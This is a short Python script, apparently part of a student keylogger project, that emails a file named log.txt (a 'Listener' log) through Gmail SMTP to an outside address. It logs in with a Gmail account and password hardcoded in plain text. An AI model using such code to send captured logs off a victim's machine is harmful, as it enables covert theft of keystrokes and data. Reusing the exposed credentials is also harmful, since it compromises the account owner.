from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from smtplib import SMTP

mensaje = MIMEMultipart("plain")
mensaje["From"] = "paquitonssn3@gmail.com"
mensaje["To"] = "cdmx2978@amerike.edu.mx"
mensaje["Subject"] = "Correo del log de Listener"

adjunto = MIMEBase("application", "octet-stream")
adjunto.set_payload(open('log.txt', 'rb').read())
encoders.encode_base64(adjunto)  # Es importante codificar el payload
adjunto.add_header("Content-Disposition", 'attachment; filename="log.txt"')
mensaje.attach(adjunto)

server = SMTP("smtp.gmail.com", 587)
server.starttls()
server.login("paquitonssn3@gmail.com", "trolladorxs")
server.sendmail(mensaje["From"], mensaje["To"], mensaje.as_string())
server.quit()
